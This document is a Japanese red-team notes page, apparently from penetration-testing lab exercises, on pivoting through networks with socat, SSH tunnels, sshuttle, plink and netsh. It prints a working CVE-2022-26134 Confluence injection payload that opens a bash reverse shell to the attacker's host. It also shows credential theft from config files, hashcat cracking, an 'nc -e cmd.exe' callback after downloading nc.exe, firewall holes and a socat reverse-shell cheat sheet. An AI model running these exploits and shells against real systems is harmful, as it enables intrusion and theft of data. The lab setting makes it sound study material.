---
title: SSH Tunnel
parent: Pivot
grand_parent: Red Team
nav_order: 3
---
# Linux Tools Portforwarding

```zsh
# 01_Simple_Sinario
```


![](assets/images/Pasted%20image%2020250719214437.png)

- Kali 192.168.45.195
- CONFULENCE01 192.168.162.63
- PGDATABASE01 10.4.162.215
CONFLUENCE01 は WAN と DMZ の両方にまたがっており、両方のネットワークで通信できることを示しています。また、CONFLUENCE01 は TCP ポート 8090 もリッスンしており、アイコンに「オープンソケット」が表示されています。

PGDATABASE01はDMZネットワーク境界内にあり、WAN/DMZをまたいでいません。KaliマシンはDMZ内にないため、PGDATABASE01に直接ルーティングすることはできません。また、PGDATABASE01には「オープンソケット」が接続されており、TCPポート5432で何かがリッスンしていることを示しています（デフォルトポートは5432なので、これはPostgreSQLサーバーである可能性が高いです）。

## CONFLUENCE01への侵入
 CVE-2022-26134
```bash
curl http://192.168.162.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.195/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

```bash
rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.162.63] 51238
bash: cannot set terminal process group (2206): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$

id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)

ip addr
4:ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    inet 192.168.162.63/24 brd 192.168.162.255 scope global ens192
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    inet 10.4.162.63/24 brd 10.4.162.255 scope global ens224

ip route
10.4.162.0/24 dev ens224 proto kernel scope link src 10.4.162.63 
192.168.162.0/24 dev ens192 proto kernel scope link src 192.168.162.63

cat /var/atlassian/application-data/confluence/confluence.cfg.xml
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.162.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
```

## Socatによるポート転送
![](../../assets/images/Pasted%20image%2020260508223742.png)

### Socat の起動

`CONFLUNCE01`

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.162.215:5432
```

### PostgresSQLへのアクセス

`Kali`

```bash
psql -h 192.168.162.63 -p 2345 -U postgres
D@t4basePassw0rd!

\l
```
![](../../assets/images/Pasted%20image%2020260508223719.png)

```bash
\c confluence
```
![](../../assets/images/Pasted%20image%2020260508223723.png)

```bash
select * from cwd_user;
```
![](../../assets/images/Pasted%20image%2020260508223710.png)

## Password_Crack
```bash
cat hashes.txt           
{PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA
{PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342
{PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc
{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R
{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv
{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP
```

```zsh
 hashid hashes.txt
                                          
--File 'hashes.txt'--
Analyzing '{PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA'
[+] PBKDF2(Atlassian) 
Analyzing '{PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342'
[+] PBKDF2(Atlassian) 
Analyzing '{PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc'
[+] PBKDF2(Atlassian) 
Analyzing '{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R'
[+] PBKDF2(Atlassian) 
Analyzing '{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv'
[+] PBKDF2(Atlassian) 
Analyzing '{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP'
[+] PBKDF2(Atlassian) 
--End of file 'hashes.txt'--  
```

```zsh
hashcat -h | grep Atlassian                                   
  12001 | Atlassian (PBKDF2-HMAC-SHA1)                               | Framework
```

```zsh
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R:Welcome1234
{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP:P@ssw0rd!
{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
```

Victim
```bash
socat TCP-LISTEN:2222,fork TCP:10.4.162.215:22
```

Kali
```bash
ssh database_admin@192.168.162.63 -p2222
sqlpass123
```

---

# SSH Tunneling

https://github.com/PowerShell/Win32-OpenSSH/releases
# SSHローカルポート転送
![](../../assets/images/Pasted%20image%2020260508223842.png)

`Kali`

```bash
#Terminal-1
rlwrap nc -nlvp 4444

#Terminal-2
curl http://192.168.162.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.195/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

CONFLENCE01
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh database_admin@10.4.162.215
sqlpass123
```

`PGDATABASE01`

```bash
ip addr
4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 10.4.162.215/24 brd 10.4.162.255 scope global ens192
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 172.16.162.254/24 brd 172.16.162.255 scope global ens224

ip route
10.4.162.0/24 dev ens192 proto kernel scope link src 10.4.162.215 
172.16.162.0/24 dev ens224 proto kernel scope link src 172.16.162.254 

for i in $(seq 1 254); do nc -zv -w 1 172.16.162.$i 445; done
```

CONFLENCE01
```bash
ssh -N -L 0.0.0.0:4455:172.16.162.217:445 database_admin@10.4.162.215
sqlpass123

#接続を確認したい場合は別のリバースシェルを確立し以下のコマンドを打ち込む
ss -ntplu
```
![](../../assets/images/Pasted%20image%2020260508223916.png)

`Kali`

```bash
smbclient -p 4455 -L //192.168.162.63/ -U hr_admin --password=Welcome1234

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Scripts         Disk      
        Users           Disk      

smbclient -p 4455 //192.168.162.63/scripts -U hr_admin --password=Welcome1234
ls

get Provisioning.ps1
```

## Lab
```bash
#Kali
rlwrap -nlvp 4444
curl http://192.168.162.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.195/5555%200%3E%261%27%29.start%28%29%22%29%7D/

#CONFULENCE01
ssh -N -L 0.0.0.0:4242in@10.4.162.215:172.16.162.217:4242 database_admin@10.4.162.215
sqlpass123

#Kali
#OffSecポータルからダウンロードしたファイルを使用してコネクションするとFlagが分かる
chmod 777 1e4c3abaa24721e69c1359811673c91f-ssh_local_client 

./1e4c3abaa24721e69c1359811673c91f-ssh_local_client -i 192.168.162.63 -p 4242 
Connecting to 192.168.162.63:4242
Flag: "OS{3b5ef7f2b1f54f6646b11b39a2aae30e}"
```

---
---

# SSHダイナミックポートフォワーディング
![](../../assets/images/Pasted%20image%2020260508223940.png)
この柔軟性を活用するには、使用するソフトウェアが正しいSOCKSプロトコル形式でパケットを送信できることを確認する必要があります。
## 初期侵入
Kali
```bash
rlwrap nc -nlvp 4444

curl http://192.168.158.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.236/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

## SSHトンネリング
Victim
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -N -D 0.0.0.0:9999 database_admin@10.4.158.215
sqlpass123
```

## Proxychainの設定
Kali
```bash
tail /etc/proxychains4.conf

sudo cp /etc/proxychains.conf /etc/proxychains.conf.bak
sudo vi /etc/proxychains.conf
```
![](../../assets/images/Pasted%20image%2020260508223951.png)

## Proxychain
### smb接続
```bash
proxychains smbclient -L //172.16.158.217/ -U hr_admin --password=Welcome1234
```
![](../../assets/images/Pasted%20image%2020260508223959.png)

## nmap

```bash
#Top 20 Ports Scan
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.158.217
Discovered open port 445/tcp on 172.16.158.217
Discovered open port 135/tcp on 172.16.158.217
Discovered open port 3389/tcp on 172.16.158.217
Discovered open port 139/tcp on 172.16.158.217

#Port Range Scan
sudo proxychains nmap -vvv -sT -p4870-4900 -Pn 172.16.158.217 | grep open
Discovered open port 4872/tcp on 172.16.158.217
```

## Lab
```bash
chmod 777 218cf66c8276ce6b350b6174e2cf70b1-ssh_dynamic_client

sudo proxychains ./218cf66c8276ce6b350b6174e2cf70b1-ssh_dynamic_client -i 172.16.158.217 -p4872
```
![](../../assets/images/Pasted%20image%2020260508224016.png)

---
#  SSHリモートポート転送
![](../../assets/images/Pasted%20image%2020260508224025.png)

## SSH Server
```bash
sudo systemctl start ssh

sudo ss -ntplu
```
![](../../assets/images/Pasted%20image%2020260508224035.png)

ユーザー名とパスワードを使用して Kali SSH サーバーに接続するには、/etc/ssh/sshd_configで PasswordAuthentication をyesに設定して、パスワードベースの認証を明示的に許可する必要がある場合があります。

Kali
```bash
rlwrap -nlvp 4444

curl http://192.168.158.63:8090/%24%7Bnew%20javax.script.ScriptEngi%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%270%3E%261%27%29.start%28%29%22%29%7D/
```

## SSH Remote Port Forwarding

Victim
```bash
#Victim 
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -N -R 127.0.0.1:2345:10.4.158.215:5432 kali@192.168.45.236
```

Kali
```
ss -ntplu
```
![](../../assets/images/Pasted%20image%2020260508224045.png)
## Database Access
kali
```bash
psql -h 127.0.0.1 -p 2345 -U postgres
D@t4basePassw0rd!

\l
```
![](../../assets/images/Pasted%20image%2020260508224055.png)
## Lab1
```bash
\c hr_backup

select * from payroll;
```
![](../../assets/images/Pasted%20image%2020260508224102.png)

## Lab2
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -N -R 127.0.0.1:2345:10.4.158.215:4444 kali@192.168.45.236

chmod 777 2e345e06246bd4465204327a6d6892a5-ssh_remote_client

./2e345e06246bd4465204327a6d6892a5-ssh_remote_client -p 2345
```
![](../../assets/images/Pasted%20image%2020260508224111.png)

---
---

# SSHリモートダイナミックポートフォワーディング
![](../../assets/images/Pasted%20image%2020260508224146.png)
リモートダイナミックポートフォワーディングは、2017年10月のOpenSSH 7.6以降でのみ利用可能になりました。ただし、この機能を使用するにはOpenSSHクライアントのバージョンが7.6以上である必要があります。サーバーのバージョンは関係ありません。

![](../../assets/images/Pasted%20image%2020260508224153.png)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 9998 kali@192.168.45.236

tail /etc/proxychains.conf
```
![](../../assets/images/Pasted%20image%2020260508224201.png)

```bash
proxychains nmap -vvv -sT -p9000-9100 -Pn -n 10.4.158.64

#nmapがダメな時の代替手段
proxychains -q nc -zv 10.4.158.64 9000-9100 -w 3
```
![](../../assets/images/Pasted%20image%2020260508224206.png)
## Lab
```bash
chmod 777 ffeb2f612236b516f854380ff9b73ee2-ssh_remote_dynamic_client

proxychains ./ffeb2f612236b516f854380ff9b73ee2-ssh_remote_dynamic_client -i 10.4.158.64 -p 9062
```
![](../../assets/images/Pasted%20image%2020260508224212.png)

---

# Using sshuttle
Terminal01
```bash
rlwrap nc -nlvp 4444
```

Terminal02
```bash
curl http://192.168.158.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.236/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

Terminal01
```
socat TCP-LISTEN:2222,fork TCP:10.4.158.215:22
```

Terminal02
```bash
sshuttle -r database_admin@192.168.158.63:2222 10.4.158.0/24 172.16.158.0/24
sqlpass123
```

Terminal03
```bash
smbclient -L //172.16.158.217/ -U hr_admin --password=Welcome1234
```
![](../../assets/images/Pasted%20image%2020260508224221.png)

---
---

# Port Forwarding Using Windows Tools

- [[#01_ssh.exe|01_ssh.exe]]
	- [[#01_ssh.exe#デフォルトインストール済みSSH関連EXE|デフォルトインストール済みSSH関連EXE]]
- [[#02_Plink|02_Plink]]
	- [[#02_Plink#Port3389をKaliのループバックに転送|Port3389をKaliのループバックに転送]]
- [[#03_Netsh|03_Netsh]]
	- [[#03_Netsh#テスト後のポート閉鎖|テスト後のポート閉鎖]]
- [[#Capstone|Capstone]]

##  01_ssh.exe
### デフォルトインストール済みSSH関連EXE
- scp.exe
- sftp.exe
- ssh.exe
```PATH
%systemdrive%\Windows\System32\OpenSSH
```

![](../../assets/images/Pasted%20image%2020260508224312.png)

Kali
```bash
sudo systemctl start ssh

xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.212.64
```

Victim
```cmd
where ssh
C:\Windows\System32\OpenSSH\ssh.exe

ssh.exe -V
OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2

ssh -N -R 9998 kali@192.168.45.206
```

kali
```bash
#ssを使用して、Kali マシン上で SOCKS プロキシ ポートが開いているかどうかを確認
ss -ntplu
tcp    LISTEN  0        128                                   [::1]:9998              [::]:*                                           

tail /etc/proxychains.conf
socks5 127.0.0.1 9998

#SQLに接続
proxychains psql -h 10.4.212.215 -U postgres
D@t4basePassw0rd!
#以下postgre
\l

```
---
## 02_Plink
*PuTTYのコマンドラインツール

![](../../assets/images/Pasted%20image%2020260508224428.png)
*シナリオでは事前にターゲットにwebshellを蔵置済
![](../../assets/images/Pasted%20image%2020260508224433.png)

Kali
```bash
sudo systemctl start apache2

find / -name nc.exe 2>/dev/null
/usr/share/windows-resources/binaries/nc.exe

sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```
バイナリが配置されたら、MULTISERVER03からダウンロードを開始できます。WebシェルからPowerShell のwgetワンライナーを使用して、 nc.exeをダウンロードします。

Kali
```bash
nc -nvlp 4446
```

Webシェルから、PowerShellにKaliマシンのWebサーバー（-Uri http://192.168.45.206/nc.exe ）からnc.exeをダウンロードし、MULTISERVER03のC:\Windows\Tempに-OutFile で書き込むよう指示するコマンドを実行します。つまり、以下のコマンドを実行します。
```
powershell wget -Uri http://192.168.45.206/nc.exe -OutFile C:\Windows\Temp\nc.exe

C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.206 4446
#実行後shellを取得できる
```

Kali
```bash
find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe

sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
```

### Port3389をKaliのループバックに転送
![](../../assets/images/Pasted%20image%2020260508224448.png)
Victim
```cmd
powershell wget -Uri http://192.168.45.206/plink.exe -OutFile C:\Windows\Temp\plink.exe

C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.206
```

Kali
```bash
#ポート確認
ss -ntplu
tcp       LISTEN     0          128                                   127.0.0.1:9833               0.0.0.0:* 

xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

---
## 03_Netsh
- *標準搭載されているファイアウォール設定ツール
- *Netshを使用してポートフォワードを作成するには管理者権限が必要*
![](../../assets/images/Pasted%20image%2020260508224458.png)

Kali
```bash
xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.212.64
```

Victim
```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.212.64 connectport=22 connectaddress=10.4.212.215

#netstatを使用してポート 2222 がリッスンしていることを確認
netstat -anp TCP | find "2222"

# netsh インターフェイスの portproxyサブコンテキストでshow allコマンドを発行して、ポート転送が保存されていることを確認
netsh interface portproxy show all
```

Kali
```bash
sudo nmap -sS 192.168.212.64 -Pn -n -p2222
PORT     STATE    SERVICE
2222/tcp filtered EtherNetIP-1
#2222は防がれていることが確認できる
```

アクセスするには、MULTISERVER03 のファイアウォールに穴を開ける必要があります。
Victim
```cmd
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.212.64 localport=2222 action=allow
OK.
```

kali
```bash
sudo nmap -sS 192.168.212.64 -Pn -n -p2222
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1

ssh database_admin@192.168.212.64 -p2222
sqlpass123
```

### テスト後のポート閉鎖
```cmd
#名前「port_forward_ssh_2222」でルールを参照して削除する方法
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
Deleted 1 rule(s).
Ok.

#作成したポート転送を削除する方法
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.212.64
```

## Capstone
```bash
#Kali
xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.212.64:3389

#Victim
ssh -N -R 9998 kali@192.168.45.206
kali

ss -ntplu

proxychains ./60440b10bbd0b9c9c71bf678ddd8e8ce-netsh_exercise_client -i 10.4.212.215 -p 4545
```

---
---

# ローカルポートフォワーディングの設定
```bash
ssh -L local_port:remote_host:remote_port user@ssh.example.com
```
- **-L**: ローカルポートフォワーディングを設定します。

# ダイナミックポートフォワーディングの設定
```bash
ssh -D local_port user@ssh.example.com
```
- **-D**: ダイナミックポートフォワーディングを設定します。

---
---

# socat


## 概要
socat は「Socket CAT」の略で、汎用ネットワークツールです。ポートフォワーディング、プロキシ、トンネリング、リダイレクトなど、様々な用途に使えます。

# ✅ よく使う socat コマンド例一覧
## 🔁 1. ポートフォワーディング（ローカルポート → リモート）
```bash
socat TCP-LISTEN:1234,fork TCP:192.168.1.10:80
```
localhost:1234 にアクセスすると 192.168.1.10:80 に転送

## ⬅️ 2. リバースシェル（サーバー側で待ち受け）
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```
ターゲット側（クライアント）で：

bash


socat TCP:attacker_ip:4444 EXEC:/bin/bash
## 🔄 3. シリアルポート ↔ TCP 接続
bash


socat /dev/ttyUSB0,raw,echo=0 TCP:192.168.1.5:23
## 🔧 4. ローカル UNIX ドメインソケット作成
bash


socat UNIX-LISTEN:/tmp/mysocket,fork EXEC:/usr/bin/myapp
## 🔁 5. 任意の TCP <-> TCP ブリッジ
bash


socat TCP-LISTEN:9000,fork TCP:example.com:443
## 🧪 6. HTTPS 通信のトンネル（証明書無視）
bash


socat - OPENSSL:example.com:443,verify=0
## 🔥 7. socat で SOCKS プロキシ経由通信
bash


socat TCP-LISTEN:8080,fork SOCKS4A:127.0.0.1:target.com:80,socksport=9050
※ Tor 通信などに使える

## 📚 socat オプション解説
オプション	説明
fork	クライアントごとに新しいプロセス
reuseaddr	ソケット再利用を許可
TCP-LISTEN	待ち受けソケットを作る
EXEC:	コマンドを実行して stdin/stdout に接続
OPENSSL:	SSL/TLS 経由で接続する

## 🔍 補足
socat はデバッグ用に -d -d オプションで詳細ログが出せます。

man socat で詳細マニュアルが見られますが、非常に長いので用途別に調べるのが効率的です。

---
# 現在起動中のsocat

現在起動中の socat プロセスを確認するには、以下のコマンドを使います：
```bash
ps aux | grep '[s]ocat'
```

またはより詳しい情報を得たい場合：
```bash
pgrep -a socat
```

それぞれの意味：
ps aux | grep '[s]ocat'：socat を含むプロセス一覧を表示します（grep socat だとそのコマンド自身も引っかかるが、[s]ocat にすることで回避）。

pgrep -a socat：実行中の socat プロセスのPIDとコマンドラインを表示します。

例：
```bash
$ ps aux | grep '[s]ocat'
root      12345  0.0  0.1   9100   500 pts/0    S+   21:01   0:00 socat TCP-LISTEN:8080,fork EXEC:/bin/bash
```
もし何も表示されない場合は、現在 socat は起動していません。

---
# 停止
socat を停止するには、プロセスID（PID）を特定して kill します。

起動中の socat プロセスを確認
```bash
pgrep -a socat
```

```bash
12345 socat TCP-LISTEN:8080,fork EXEC:/bin/bash
```

プロセスを停止
```bash
kill 12345
```

強制終了したい場合：
```bash
kill -9 12345
```

複数の socat が起動している場合は、すべてのPIDを kill してください。
```bash
pkill socat
```
で一括停止も可能です（注意して使用してください）。
